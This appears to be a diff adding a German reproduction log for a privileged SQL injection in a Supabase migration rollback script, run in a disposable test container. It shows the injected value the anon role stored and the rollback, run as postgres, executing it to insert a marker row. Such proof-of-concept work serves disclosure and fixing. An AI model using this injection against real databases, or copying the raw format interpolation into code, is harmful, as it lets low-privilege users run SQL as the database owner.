@@ -1,0 +1,27 @@
+Reproduktion der privilegierten SQL-Injektion (Vor-Zustand des Artefakts)
+Artefakt: supabase/migrations/ROLLBACK_20260828100000_landing_analytics_anon_insert_entzogen.sql
+Fassung:  sha256 c329d13bba10f96c9105fd2a55003c2d02daa088f63195e7110b98951a5b2526 (Commit ac26a2ed)
+Umgebung: Wegwerf-Container supabase_db_crm-test — NICHT die Produktion
+Zeit:     2026-08-28T12:06:21Z
+
+Der Angriff: anon beschreibt undo_20260828100000.withcheck; die alte
+Ruecknahme setzte den Wert mit %s roh in EXECUTE format(...) ein.
+
+DROP TABLE
+DROP TABLE
+DROP TABLE
+CREATE TABLE
+GRANT
+CREATE TABLE
+CREATE TABLE
+INSERT 0 1
+BEGIN
+UPDATE 1
+ anon setzte: true); INSERT INTO public.beute VALUES ('anon hat als postgres geschrieben'); --
+
+COMMIT
+--- Betreiber fuehrt die ALTE Ruecknahme aus (als postgres) ---
+NOTICE:  Policy Service role can insert analytics wiederhergestellt (roles=PUBLIC, WITH CHECK true); INSERT INTO public.beute VALUES ('anon hat als postgres geschrieben'); --)
+COMMIT
+--- Ergebnis: wurde fremdes SQL ausgefuehrt? ---
+beute: anon hat als postgres geschrieben
